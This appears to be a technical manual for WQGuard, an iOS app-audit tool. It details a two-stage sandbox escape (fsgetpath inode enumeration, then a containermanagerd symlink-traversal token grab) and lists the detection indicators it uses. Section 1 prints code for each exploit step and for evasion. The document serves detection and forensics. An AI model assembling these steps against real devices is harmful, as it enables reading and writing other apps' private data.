# WQGuard Technical Architecture, Exploit Deep Dive & Reference Manual

> **Document Version**: 1.2.1  
> **Target Systems**: iOS 26.2+ / iOS 27.x, macOS Darwin 24.x+ (Host Tooling)  
> **Security Baseline**: 100% Read-Only Inspection, Zero-Modification & Strict Zero-Trust Sideload Policy  
> **Classification**: Technical Architecture, Vulnerability Anatomy & Threat Catalog  

---

## Table of Contents
1. [Two-Stage Sandbox Escape Exploit Mechanics](#1-two-stage-sandbox-escape-exploit-mechanics)
   - [1.1 Apple Sandbox (Seatbelt) & The Confused Deputy Problem](#11-apple-sandbox-seatbelt--the-confused-deputy-problem)
   - [1.2 Cryptographic Gating: The Role of App Groups](#12-cryptographic-gating-the-role-of-app-groups)
   - [1.3 Stage 1: APFS Inode Brute-Force & Path Leaking (bad_query / pathleak)](#13-stage-1-apfs-inode-brute-force--path-leaking-bad_query--pathleak)
   - [1.4 Stage 2: containermanagerd Symlink Traversal (worse_query)](#14-stage-2-containermanagerd-symlink-traversal-worse_query)
   - [1.5 Kernel Sandbox Extension Table Exhaustion (SEC-M5-02)](#15-kernel-sandbox-extension-table-exhaustion-sec-m5-02)
   - [1.6 Evasion Techniques & Behavioral Tuple Heuristics](#16-evasion-techniques--behavioral-tuple-heuristics)
2. [LaunchServices CSStore2 Cache & MCM Metadata Analysis](#2-launchservices-csstore2-cache--mcm-metadata-analysis)
   - [2.1 CSStore2 Database Format ("bdsl") & Memory-Mapped Architecture](#21-csstore2-database-format-bdsl--memory-mapped-architecture)
   - [2.2 OS-Specific Unit Record Layout Specifications (iOS 26 vs iOS 27)](#22-os-specific-unit-record-layout-specifications-ios-26-vs-ios-27)
   - [2.3 Unicode Sanitization & Trojan Source / BiDi Defense](#23-unicode-sanitization--trojan-source--bidi-defense)
   - [2.4 MCM Metadata Plist Structure & Container Class Taxonomy](#24-mcm-metadata-plist-structure--container-class-taxonomy)
   - [2.5 Detection of Unauthorized Bundle Registrations & Container Hijacking](#25-detection-of-unauthorized-bundle-registrations--container-hijacking)
3. [Complete Threat Indicator Reference Catalog](#3-complete-threat-indicator-reference-catalog)
   - [3.1 Core Container Manager Indicators (CM-01 through CM-07)](#31-core-container-manager-indicators-cm-01-through-cm-07)
   - [3.2 Expanded Threat Signatures (EXP-01 through EXP-08)](#32-expanded-threat-signatures-exp-01-through-exp-08)
   - [3.3 Comprehensive Threat Signature Matrix](#33-comprehensive-threat-signature-matrix)
4. [Firmware CVE Exposure Radar & Non-Upgrade Posture Mitigations](#4-firmware-cve-exposure-radar--non-upgrade-posture-mitigations)
   - [4.1 2026 Firmware CVE Exposure Radar Matrix](#41-2026-firmware-cve-exposure-radar-matrix)
   - [4.2 Surge Brotli Shield Architecture (CVE-2026-111497 / HTTP2Shell)](#42-surge-brotli-shield-architecture-cve-2026-111497--http2shell)
   - [4.3 Mandatory Negative MITM Exclusions (Protecting Siri & Apple Intelligence)](#43-mandatory-negative-mitm-exclusions-protecting-siri--apple-intelligence)
   - [4.4 iOS Lockdown Mode Deployment & Hardening](#44-ios-lockdown-mode-deployment--hardening)
   - [4.5 System Services Hardening (AirDrop, Bluetooth, iMessage)](#45-system-services-hardening-airdrop-bluetooth-imessage)
5. [CLI & Library Advanced Usage](#5-cli--library-advanced-usage)
   - [5.1 wqguard-cli Command-Line Manual & Argument Matrix](#51-wqguard-cli-command-line-manual--argument-matrix)
   - [5.2 Terminal Styler, Live Progress Bars & Exit Codes](#52-terminal-styler-live-progress-bars--exit-codes)
   - [5.3 Automated Auditing & Shell Scripting Examples](#53-automated-auditing--shell-scripting-examples)
   - [5.4 Swift Package Library Integration (WQGuardCore)](#54-swift-package-library-integration-wqguardcore)
6. [Official Identifiers, Entitlements & Open-Source Governance](#6-official-identifiers-entitlements--open-source-governance)
   - [6.1 Production Bundle Identifiers & App Groups](#61-production-bundle-identifiers--app-groups)
   - [6.2 Third-Party Identity Isolation & Whitelist Clarification](#62-third-party-identity-isolation--whitelist-clarification)

---

## 1. Two-Stage Sandbox Escape Exploit Mechanics

### 1.1 Apple Sandbox (Seatbelt) & The Confused Deputy Problem
On iOS and macOS Darwin kernels, every third-party application runs within an isolated sandbox environment managed by the **Seatbelt** kernel extension (`com.apple.security.seatbelt`). Sandboxed processes are governed by mandatory access control (MAC) profile rules:
- **Sandbox Root**: An application is confined to its randomized container directories:
  - Bundle Container: `/var/mobile/Containers/Bundle/Application/<UUID>/`
  - Data Container: `/var/mobile/Containers/Data/Application/<UUID>/`
- **File System Denial**: The sandbox policy explicitly denies directory reads and traversals across parent container paths:
  ```scheme
  (deny file-read-data (subpath "/private/var/mobile/Containers"))
  (deny file-write*    (subpath "/private/var/mobile/Containers"))
  ```
Because processes cannot access other containers directly, Apple delegates inter-container data sharing, container creation, and sandbox token issuance to a dedicated system daemon: `containermanagerd` (listening on Mach service `com.apple.containermanagerd` and `com.apple.containermanagerd.system`).

`containermanagerd` runs with elevated privileges (`mobile` or `root`) and holds broad Seatbelt bypass entitlements. It acts as an **authorized deputy** to issue kernel sandbox extension tokens (`sandbox_extension_issue_file()`). When an authorized deputy processes input from an untrusted client without validating the canonical file system path boundary, it becomes a **Confused Deputy**.

---

### 1.2 Cryptographic Gating: The Role of App Groups
In the iOS security architecture, applications from the same developer organization can share data via **App Groups**. App Groups are designated by reverse-DNS strings (e.g., `group.com.example.app`) and correspond to shared directories under:
```
/var/mobile/Containers/Shared/AppGroup/<UUID>/
```
To prevent arbitrary apps from accessing another developer's shared container, Apple enforces cryptographic entitlement verification at the kernel and daemon level:
1. The app's Mach-O binary (and each embedded `PlugIns/*.appex` or `Extensions/*.appex` extension) must embed an Apple-signed `CSBlob` (SuperBlob magic `0xfade0cc0`).
2. The `CSBlob` contains the entitlements dictionary in **Slot 5 (XML Plist, `0xfade7171`)** and/or **Slot 7 (Apple CoreEntitlements v1 ASN.1 DER wrapped in `[APPLICATION 16]` `0x70` + `[CONTEXT 16]` `0xb0`, `0xfade7172`)**, which WQGuard unions across all executable ARM slices.
3. The entitlement key `com.apple.security.application-groups` must list the group identifier.

#### The Impossibility Invariant
`containermanagerd` strictly checks whether the client's code signing credentials include the requested group identifier before performing any container operation. An application lacking `com.apple.security.application-groups` **is physically rejected by containermanagerd with error -1**.

Therefore, after checking App-Group-independent APFS inode enumeration syscalls (`fsgetpath` / `CM-05`) and bundle-level threats, WQGuard's **Layer 1 Gating Engine** fast-paths any binary lacking `com.apple.security.application-groups` (and lacking standalone syscalls) as `RiskTier.safe` in constant time ($O(1)$ fast-path), eliminating false alarms for benign applications.

#### WQGuard Native App Group Declarations
In WQGuard's own deployment architecture:
- Application Bundle Identifier: `com.wqguard.app`
- Primary App Group: `group.com.wqguard.app`
- Dedicated Scanner App Group: `group.com.wqguard.scanner`
The primary App Group `group.com.wqguard.app` is declared in `WQGuard.entitlements` as the application's runtime App Group, while `group.com.wqguard.scanner` is registered as an approved target App Group inside `WhitelistEngine.swift` (see [Section 6](#6-official-identifiers-entitlements--open-source-governance) for detailed specifications).

```
┌────────────────────────────────────────────────────────┐
│                   Target Application                   │
│  (Embedded CSBlob: com.apple.security.application-groups)│
└───────────────────────────┬────────────────────────────┘
                            │
               [Layer 1 Entitlement Gating]
                            │
              ┌─────────────┴─────────────┐
              ▼                           ▼
      Has App Group?               No App Group
      [Proceed to L2]             [FAST-PATH: SAFE]
```

---

### 1.3 Stage 1: APFS Inode Brute-Force & Path Leaking (bad_query / pathleak)
An attacker possessing an App Group entitlement faces a structural obstacle: **iOS randomizes container UUIDs**. The attacker cannot hardcode `/var/mobile/Containers/Data/Application/<Victim-UUID>/` because the UUID is generated randomly upon installation. Furthermore, the Seatbelt sandbox denies listing `/var/mobile/Containers/Data/Application`.

To discover victim container UUIDs entirely on-device without a jailbreak, exploits employ an **APFS inode resolution primitive** (`bad_query.c` / `pathleak.m`):

```c
// Undocumented Darwin / BSD System Call
ssize_t fsgetpath(char *buf, size_t buflen, fsid_t *fsid, uint64_t ino);
```

#### Vulnerability Root Cause in Seatbelt
Seatbelt policies restrict directory enumeration (`file-read-data` on the directory vnode), but historically omitted restrictions on the `fsgetpath` syscall. `fsgetpath` takes a file system ID (`fsid`) and a 64-bit inode number (`ino`), directly querying the APFS Object Map (omap) in the kernel to reconstruct the file path into a caller-supplied buffer:

```c
// bad_query.c / pathleak.m Inode Scanner
char buf[1200];
for (uint64_t ino = 1; ino <= max_inode; ino++) {
    ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
    if (n <= 0) continue;
    // Check if the path targets the application container directory
    if (strncmp(buf, "/private/var/mobile/Containers/Data/Application/", 48) == 0) {
        // Leaked container UUID discovered!
    }
}
```

#### Exploit Performance & System Impact (SEC-M5-04)
- Iterating 15,000,000 inodes via synchronous system calls causes severe APFS buffer cache thrashing.
- Running this loop on the main thread blocks UI run loops and triggers the iOS watchdog (`0x8badf00d`), terminating the process.
- Alternatively, attackers parse the LaunchServices `CSStore2` cache (`.csstore`), which maps bundle identifiers directly to container UUIDs in memory.

---

### 1.4 Stage 2: containermanagerd Symlink Traversal (worse_query)
Once the target victim container UUID is acquired, the attacker executes the second stage: **the Confused Deputy Symlink Traversal (`worse_query.m`)**.

#### The Step-by-Step Exploit Sequence:
1. **App Group Path Resolution**: The attacker retrieves the file system path of their own authorized App Group container:
   ```objc
   NSURL *groupRoot = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier: @"group.attacker.shared"];
   NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
   ```
2. **Private API Resolution**: The attacker resolves private APIs from `libsystem_containermanager.dylib`:
   ```c
   void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
   container_query_create_fn query_create = dlsym(mgr, "container_query_create");
   container_query_set_class_fn query_set_class = dlsym(mgr, "container_query_set_class");
   container_query_set_identifiers_fn query_set_group_identifiers = dlsym(mgr, "container_query_set_group_identifiers");
   container_query_set_part_fn query_set_part = dlsym(mgr, "container_query_operation_set_part");
   container_query_set_flags_fn query_set_flags = dlsym(mgr, "container_query_operation_set_flags");
   container_query_get_single_result_fn query_get_single_result = dlsym(mgr, "container_query_get_single_result");
   container_copy_sandbox_token_fn copy_sandbox_token = dlsym(mgr, "container_copy_sandbox_token");
   sandbox_extension_consume_fn consume_extension = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
   ```
3. **Query Initialization**:
   - `query_set_class(query, 7)`: Requests `CONTAINER_CLASS_GROUP_DATA` (Class 7).
   - `query_set_group_identifiers(query, "group.attacker.shared")`: Legitimate group owned by attacker.
   - `query_set_part(query, 3)`: Requests subpath `Library/Caches` (Part 3).
   - `query_set_flags(query, 0x0000008000000000ULL)`: Sets query operation flags (or `0x0000000800000000ULL` on iOS 26).
4. **Symlink Manipulation (The Race Window)**:
   The attacker deletes their legitimate `Library/Caches` directory and replaces it with a symbolic link pointing to the victim directory:
   ```objc
   [files removeItemAtPath:caches error:nil];
   [files createSymbolicLinkAtPath:caches withDestinationPath:targetVictimPath error:nil];
   ```
5. **Confused Deputy Execution in containermanagerd**:
   The query is dispatched across XPC to `containermanagerd`:
   ```objc
   void *result = query_get_single_result(query);
   ```
   - `containermanagerd` checks: *Does caller possess entitlement `group.attacker.shared`?* **YES.**
   - `containermanagerd` resolves the path for Part 3 (`Library/Caches`).
   - It calls `realpath()` or canonical path resolution on `<OwnAppGroup>/Library/Caches`.
   - **THE FLAW**: The daemon resolves through the symbolic link to `targetVictimPath` (e.g., `/var/mobile/Containers/Data/Application/<Victim-UUID>/Documents`), but **fails to assert that the canonicalized path remains within `<OwnAppGroup>/`**.
   - `containermanagerd` calls the kernel:
     ```c
     char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read-write", targetVictimPath, 0);
     ```
   - The kernel generates an authenticated Seatbelt extension token for `targetVictimPath` and returns it across XPC!
6. **Token Consumption**:
   The attacker retrieves and consumes the token:
   ```c
   char *token = copy_sandbox_token(result);
   int64_t handle = consume_extension(token);
   ```
   The Darwin kernel installs the sandbox extension directly into the process's active credentials. The calling app can now freely read and write the victim container!
7. **Anti-Forensic Cleanup**:
   The attacker deletes the symlink and recreates an empty `Library/Caches` directory (`clean_symlink`) to prevent crashes during legitimate system cache flushes.

```
+---------------------------------------------------------------------------------------------------+
|                                worse_query Execution Flow                                         |
+---------------------------------------------------------------------------------------------------+
|  [Attacker Process]                                           [containermanagerd (Privileged)]    |
|       |                                                                      |                    |
|  1. symlink(Caches -> Victim)                                                |                    |
|       |                                                                      |                    |
|  2. container_query_get_single_result(class=7, part=3) --------------------> |                    |
|                                                                              |                    |
|                                                                       3. Check Group Entitlement  |
|                                                                          (Attacker owns group: OK)|
|                                                                              |                    |
|                                                                       4. realpath(part=3)         |
|                                                                          -> Follows Symlink!      |
|                                                                          -> Path = Target Victim  |
|                                                                              |                    |
|                                                                       5. sandbox_extension_issue()|
|                                                                          (Issues token for Target)|
|                                                                              |                    |
|  6. Receive Sandbox Token <------------------------------------------------- |                    |
|       |                                                                                           |
|  7. sandbox_extension_consume(token)                                                              |
|     => KERNEL PRIVILEGES ACQUIRED!                                                                |
|       |                                                                                           |
|  8. clean_symlink() (Restores real Caches directory)                                              |
+---------------------------------------------------------------------------------------------------+
```

---

### 1.5 Kernel Sandbox Extension Table Exhaustion (SEC-M5-02)
Every call to `sandbox_extension_consume(token)` allocates a slot in the Darwin kernel's fixed-size per-process sandbox extension table (typically 256 or 512 entries).

```c
// Failure Mode
int64_t handle = consume_extension(token);
// If handle is discarded without sandbox_extension_release(handle)...
// After ~256 scans:
// sandbox_extension_consume returns -6 (Table Full / KERN_NO_SPACE)
```

#### WQGuard RAII Scoped Token Guard
WQGuard prevents kernel resource exhaustion during batch audits of 200+ apps using an RAII wrapper:

```swift
public final class ScopedSandboxToken: @unchecked Sendable {
    public let handle: Int64
    private var isReleased: Bool = false
    private let lock = NSLock()

    public init(handle: Int64) { self.handle = handle }

    public func release() {
        lock.lock(); defer { lock.unlock() }
        guard !isReleased else { return }
        isReleased = true
        if handle > 0 {
            #if os(iOS)
            typealias ReleaseFn = @convention(c) (Int64) -> Int32
            if let handlePtr = dlopen(nil, RTLD_NOW),
               let sym = dlsym(handlePtr, "sandbox_extension_release") {
                let releaseFn = unsafeBitCast(sym, to: ReleaseFn.self)
                _ = releaseFn(handle)
            }
            #endif
        }
    }
    deinit { release() }
}
```

---

### 1.6 Evasion Techniques & Behavioral Tuple Heuristics
Malicious developers employ evasion techniques to bypass static string scanning:
1. **Dynamic Resolution**: Never linking `libsystem_containermanager.dylib` in `LC_LOAD_DYLIB`.
2. **String Obfuscation**: XOR/RC4 encrypting API strings like `"container_query_create"`.
3. **Direct XPC Bypass**: Bypassing `libsystem_containermanager.dylib` entirely by calling `xpc_connection_create_mach_service("com.apple.containermanagerd", NULL)`.

#### The WQGuard Behavioral Tuple Heuristic (`TUPLE_OBFUSCATED_EXPLOIT`)
Even if every string is encrypted, the operating system enforces structural constraints:
- `com.apple.security.application-groups` **cannot be obfuscated** because kernel AMFI validates the plaintext `CSBlob`.
- Unencrypted binaries (`cryptid == 0`) must invoke dynamic loader APIs (`dlopen`, `dlsym`) to resolve unlinked APIs.
- The exploit **must invoke symlink creation APIs** (`symlink`, `symlinkat`, `createSymbolicLinkAtPath:withDestinationPath:error:`, `createSymbolicLinkAtURL:withDestinationURL:error:`) or sandbox consumption (`sandbox_extension_consume`).

When WQGuard detects this combination in an unencrypted sideloaded binary (across both `LC_SYMTAB` and stripped Objective-C `__objc_methname` selector tables):
$$\text{cryptid} = 0 \quad\land\quad \text{AppGroups} \quad\land\quad (\text{dlopen} \land \text{dlsym}) \quad\land\quad (\text{symlink} \lor \text{sandbox\_consume} \lor \text{fsgetpath})$$
It raises **`TUPLE_OBFUSCATED_EXPLOIT` (`CM-07`, High Risk)**, neutralizing symbol-stripping and XOR evasion.

---

## 2. LaunchServices CSStore2 Cache & MCM Metadata Analysis

> **Deployment Boundary Note (Standard iOS Seatbelt vs. Host/Unsandboxed Forensics)**: On non-jailbroken stock iOS devices, Apple's Seatbelt sandbox prevents standard user applications from reading `/var/mobile/Library/Caches/*.csstore` or enumerating `/var/mobile/Containers/Shared/AppGroup` outside their own developer group. On stock iOS, WQGuard audits installed apps without exploits via `lockdownd` / `installation_proxy` (`Engine 1A/1B`), `.ipa` / `.tipa` binary inspection (`Engine 2`), and URL-scheme presence probes (`Engine 3`). `CSStore2Parser`, `MCMReader`, and `ContainerScanner` operate in **macOS host/backup forensics (`wqguard-cli --scan-system` / `--container`) and unsandboxed (`com.apple.private.security.no-sandbox` / TrollStore / jailbroken) research environments**.

### 2.1 CSStore2 Database Format ("bdsl") & Memory-Mapped Architecture
Apple's LaunchServices daemon (`lsd`) maintains a fast, compiled binary database of all installed applications, app extensions, URL schemes, and container bindings. These caches reside in:
```
/var/mobile/Library/Caches/com.apple.LaunchServices-*.csstore
~/Library/Caches/com.apple.LaunchServices-*.csstore (macOS)
```
- **Magic Header**: The first 4 bytes must equal `0x62 0x64 0x73 0x6c` (ASCII `"bdsl"`).
- **String Heap Anchor**: Strings are stored in a dedicated heap following the anchor marker `Data([0x3c, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3e])` (`"<string>"`).
- **String Reference Encoding**: In LaunchServices unit records, string pointers are stored as 32-bit references shifted right by 2:
  $$\text{StringID} = \text{Ref} \gg 2$$
  The least significant 2 bits store internal allocation flags (`(ref & 3) == 0`).
- **Memory Safety Guardrails**: WQGuard enforces strict limits during CSStore parsing:
  - Minimum size: 4 KB (`0x1000`)
  - Maximum size: 64 MB (`64 * 1024 * 1024`)
  - String ID bitset: 16M IDs max (`0x01000000`), requiring a 2 MB index bitmap.
  - Maximum records decoded: 100,000 bundle records, 200,000 strings.

---

### 2.2 OS-Specific Unit Record Layout Specifications (iOS 26 vs iOS 27)
LaunchServices modifies the internal structure of unit records across iOS major and minor versions. WQGuard's `CSStore2Parser` incorporates a dynamic multi-layout scoring engine supporting all known schemas:

| OS Version Label | Bundle Record Size | Bundle ID Offset | Container Offset | Name Offset | Display Name Offset | Plugin Record Size | Plugin BundleID Offset | Plugin Container Offset |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **iOS 27.0** | `0x250` | `0x0c` | `0x68` | `0x6c` | `0x74` | `0x118` | `0x00` | `0x54` |
| **iOS 26.x** | `0x23c` | `0x0c` | `0x64` | `0x68` | `0x70` | `0x104` | `0x00` | `0x50` |
| **iOS 27.2** | `0x25c` | `0x0c` | `0x6c` | `0x70` | `0x78` | `0x120` | `0x00` | `0x58` |
| **iOS 27.2b** | `0x25c` | `0x10` | `0x6c` | `0x70` | `0x78` | `0x120` | `0x04` | `0x58` |
| **iOS 27.2c** | `0x25c` | `0x0c` | `0x6c` | `0x70` | `0x78` | `0x120` | `0x04` | `0x58` |
| **iOS 27.2d** | `0x25c` | `0x10` | `0x6c` | `0x70` | `0x78` | `0x120` | `0x00` | `0x58` |

#### Scoring & Layout Selection Engine
The parser executes parallel passes for each layout specification. It validates that:
1. Candidate Bundle IDs conform to reverse-DNS formatting (`looksLikeBundleID`).
2. Candidate container paths match `/var/mobile/Containers/Data/Application/<UUID>`.
3. The layout with the highest verified mapping count (`totalMapped = apps + plugins`) is selected.

---

### 2.3 Unicode Sanitization & Trojan Source / BiDi Defense
Malicious sideloaded applications frequently abuse Unicode Bidirectional (BiDi) overrides and zero-width non-printable characters to disguise their true display name or bundle identity (e.g., disguising a trojan as `App Store` or masking executable extensions).

WQGuard's `CSStore2Parser.sanitizeUnicodeName()` enforces strict filtering:
- Replaces format scalars and BiDi control characters (`0x202a`–`0x202e`, `0x2060`–`0x206f`, `0x200b`–`0x200f`, `0xfeff`) with the replacement glyph `\u{FFFD}`.
- Rejects ASCII C0 control characters (`0x00`–`0x1F`, `0x7F`).
- Enforces Unicode Normalization Form C (`precomposedStringWithCanonicalMapping`).
- Prohibits leading slashes or paths mimicking file extensions (e.g., `.app/`).

---

### 2.4 MCM Metadata Plist Structure & Container Class Taxonomy
In every container root, `containermanagerd` writes an authoritative metadata property list:
```
.com.apple.mobile_container_manager.metadata.plist
```
WQGuard's `MCMReader` reads this file using `O_RDONLY | O_NOFOLLOW | O_CLOEXEC` with a 1 MB file size cap.

#### Container Classes (`MCMMetadataClass`):
```swift
public enum MCMContainerClass: Int {
    case appData        = 1   // /var/mobile/Containers/Data/Application
    case vpn            = 2   // VPN Container
    case system         = 3   // System Container
    case temporary      = 4   // Temporary Data
    case bundle         = 5   // Bundle Container (/Containers/Bundle/Application)
    case appGroup       = 7   // Shared App Group (/Containers/Shared/AppGroup)
    case plugin         = 10  // PluginKit Plugin (/Containers/Data/PluginKitPlugin)
    case internalDaemon = 11  // Internal System Daemon
    case systemGroup    = 12  // System Group (/Containers/Shared/SystemGroup)
}
```

#### Metadata Keys Extracted:
- `MCMMetadataIdentifier` (String): Authoritative Bundle ID or App Group identifier.
- `MCMMetadataUUID` (String): Canonical 36-character RFC 4122 container UUID.
- `MCMMetadataClass` (Integer): Container class enum.
- `MCMMetadataVersion` (Integer): Metadata schema version (default: 1).
- `MCMMetadataUser` (String): Owner account (e.g., `mobile`).

---

### 2.5 Detection of Unauthorized Bundle Registrations & Container Hijacking
By correlating `CSStore2` cache entries with physical `.com.apple.mobile_container_manager.metadata.plist` records, WQGuard detects three major container hijacking vectors:
1. **Container Hijacking**: A malicious sideloaded package declares an identical `MCMMetadataIdentifier` to hijack an App Store app's data directory.
2. **Metadata Tampering**: Sideloaded tools mutating `.com.apple.mobile_container_manager.metadata.plist` to forge permissions or redirect container pointers.
3. **Symlink Metadata Hijack**: Replacing `.com.apple.mobile_container_manager.metadata.plist` with a symbolic link. `MCMReader` detects this with `lstat` and throws `MCMReaderError.symlinkEncountered`.

---

## 3. Complete Threat Indicator Reference Catalog

### 3.1 Core Container Manager Indicators (CM-01 through CM-07)

#### `CM-01`: Direct Linkage to `libsystem_containermanager.dylib`
- **Identifier**: `DYLIB_CONTAINERMANAGER`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 Static Scanner (`LC_LOAD_DYLIB`)
- **Technical Description**: The Mach-O binary contains an explicit `LC_LOAD_DYLIB` command linking `/usr/lib/system/libsystem_containermanager.dylib`. Normal iOS App Store applications are prohibited from linking this private system library.
- **Exploit Path**: Used by container exploit tools to link IPC wrappers for querying `containermanagerd`.
- **Remediation**: Uninstall immediately and revoke any associated provisioning profile. Under WQGuard's strict zero-trust policy, no third-party container or sideloading tool is exempted by default.

#### `CM-02`: containermanager Query & Token Symbol References
- **Identifier**: `SYM_CONTAINER_APIS` (`SYM_QUERY_CREATE`, `SYM_SET_GROUP_IDENTIFIERS`, `SYM_SET_PART`, `SYM_SET_FLAGS`, `SYM_GET_SINGLE_RESULT`, `SYM_COPY_SANDBOX_TOKEN`)
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 Static Scanner (`LC_SYMTAB` across all ARM slices)
- **Technical Description**: Binary references private symbols including `container_query_create`, `container_query_operation_set_part`, `container_query_operation_set_flags`, `container_copy_sandbox_token`, or `container_query_get_single_result`.
- **Exploit Path**: The exact C function call sequence required to trigger the `worse_query` sandbox escape.
- **Remediation**: The app contains functional exploit code for container sandbox escaping. Isolate and remove the binary.

#### `CM-03`: Direct XPC Mach Service Bypass
- **Identifier**: `XPC_CONTAINERMANAGERD` / `XPC_CONTAINERMANAGERD_SYSTEM`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 Static Scanner (`__TEXT,__cstring`)
- **Technical Description**: Binary contains ASCII strings `"com.apple.containermanagerd"` or `"com.apple.containermanagerd.system"`.
- **Exploit Path**: Stealth exploit variant bypassing `libsystem_containermanager.dylib` C wrappers to speak raw XPC directly to the daemon via `xpc_connection_create_mach_service`.
- **Remediation**: Highly suspicious in any non-system application. Audit embedded frameworks and quarantine package.

#### `CM-04`: Darwin Seatbelt Sandbox Extension Token Consumption
- **Identifier**: `SYM_SANDBOX_EXTENSION_CONSUME` / `SYM_SANDBOX_EXTENSION_RELEASE`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 Static Scanner (`LC_SYMTAB` across all ARM slices)
- **Technical Description**: Binary imports `sandbox_extension_consume` or `sandbox_extension_release` from libsystem.
- **Exploit Path**: Final stage of sandbox escape: converts the token received from `containermanagerd` into kernel filesystem access privileges.
- **Remediation**: Legitimate third-party apps never call Seatbelt extension consumption APIs directly. Treat binary as an active exploit payload.

#### `CM-05`: APFS Inode Brute-Force Path Leak Primitive
- **Identifier**: `SYM_FSGETPATH` / `SYM_CONTAINER_OBJECT_GET_PATH`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 Static Scanner (`LC_SYMTAB` + `__TEXT` string patterns, evaluated prior to App Group fast-path gating)
- **Technical Description**: Binary imports the BSD syscall `fsgetpath` or `container_object_get_path`, frequently paired with container path prefixes (`/Containers/Data/`, `/Containers/Shared/`). Evaluated independently of `com.apple.security.application-groups` so standalone reconnaissance binaries are never gated out.
- **Exploit Path**: Stage 1 container UUID discovery (`bad_query` / `pathleak`).
- **Remediation**: `fsgetpath` has zero legitimate use in consumer iOS apps. Indicates active sandbox reconnaissance.

#### `CM-06`: Anomalous Escaping Symlink in Shared Container
- **Identifier**: `CONTAINER_CACHES_SYMLINK` / `CONTAINER_ESCAPING_SYMLINK`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 3 Container Artifact Scanner (`lstat`, `readlink`)
- **Technical Description**: `Library/Caches` inside an App Group container, or a file within it, has been replaced by a symbolic link (`S_ISLNK`) resolving outside the container boundary.
- **Exploit Path**: Artifact left behind by `worse_query` or persistent cross-container read/write tunnels.
- **Remediation**: WQGuard records the exact symlink destination in 100% read-only mode without traversing or modifying the filesystem. Uninstall the offending application and reboot the device to revoke active kernel tokens.

#### `CM-07`: Obfuscation-Resistant Behavioral Tuple
- **Identifier**: `TUPLE_OBFUSCATED_EXPLOIT`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 Heuristic Behavioral Engine (`LC_SYMTAB` + `__objc_methname`)
- **Technical Description**: An unencrypted binary (`cryptid == 0`) combining `com.apple.security.application-groups`, dynamic loading primitives (`dlopen`/`dlsym`), and symlink manipulation (`symlink`, `symlinkat`, `createSymbolicLinkAtPath:withDestinationPath:error:`, `createSymbolicLinkAtURL:withDestinationURL:error:`) or sandbox APIs.
- **Exploit Path**: Catches stripped, XOR-encrypted, or dynamically obfuscated variants of `worse_query`.
- **Remediation**: High-confidence heuristic alert. Binary is actively concealing exploit primitives. Block execution.

---

### 3.2 Expanded Threat Signatures (EXP-01 through EXP-08)

#### `EXP-01`: Private Apple Photos Framework Linkage
- **Identifier**: `EXP-01:PhotosFramework`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 Static Scanner (`LC_LOAD_DYLIB`)
- **Technical Description**: Binary links `PhotoLibraryServices.framework` or `AssetsLibraryServices.framework`.
- **Exploit Path**: Vector for `CVE-2026-112676`: bypasses iOS TCC privacy prompts to access the user's entire camera roll and hidden album silently.
- **Remediation**: Revoke all permissions and uninstall. Sideloaded apps linking private photo frameworks are spyware or token scrapers.

#### `EXP-02`: Private Apple Photos API & Symbol Reference
- **Identifier**: `EXP-02:PhotosSymbols`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 Static Scanner (`LC_SYMTAB` + `__objc_methname`)
- **Technical Description**: Binary references `PLPhotoLibrary`, `_OBJC_CLASS_$_PLPhotoLibrary`, `systemPhotoLibrary`, or `openPhotoLibrary`.
- **Exploit Path**: Direct invocation of private Photos daemon IPC methods.
- **Remediation**: Quarantine binary. Do not store sensitive credentials or recovery phrases in system photos.

#### `EXP-03`: Unauthorized Private Photos Entitlement
- **Identifier**: `EXP-03:PhotosEntitlement`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 1 CSBlob Entitlement Parser (merged XML Slot 5 + CoreEntitlements DER Slot 7)
- **Technical Description**: App declares internal Apple entitlements: `com.apple.private.photos.*` or `com.apple.photos.bourgeoisie`.
- **Exploit Path**: Entitlement-based privacy bypass allowing background photo exfiltration.
- **Remediation**: Delete application immediately. Only first-party Apple components can legitimately possess this entitlement.

#### `EXP-04`: Bundled Vulnerable `libbrotli` Supply Chain Notice
- **Identifier**: `EXP-04:BrotliSupplyChain`
- **Severity**: `MEDIUM` (`RiskTier.caution`)
- **Detection Layer**: Layer 2 Static Scanner (`LC_LOAD_DYLIB`, `LC_SYMTAB`)
- **Technical Description**: Binary bundles `libbrotli`, `brotli.framework`, or references `BrotliDecoderDecompressStream`.
- **Exploit Path**: Supply chain exposure to `CVE-2026-111497` (`HTTP2Shell`, CVSS 9.2). Out-of-bounds heap write during Brotli stream decoding.
- **Remediation**: Verify embedded `libbrotli` is version $\ge$ 1.2.1. Deploy WQGuard Brotli Shield to strip HTTP `br` streams.

#### `EXP-05`: Repackaged Web3 Crypto Wallet Impersonation
- **Identifier**: `EXP-05:WalletImpersonation`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 Bundle & Identity Inspector (word-token & dot-delimited boundary matcher)
- **Technical Description**: Sideloaded or enterprise package (`cryptid == 0`) impersonating major crypto wallet brands: MetaMask, Trust Wallet, Phantom, OKX, Binance, TokenPocket, imToken, Bitget.
- **Exploit Path**: #1 real-world iOS crypto theft vector: repackaged drainers logging seed phrases and private keys.
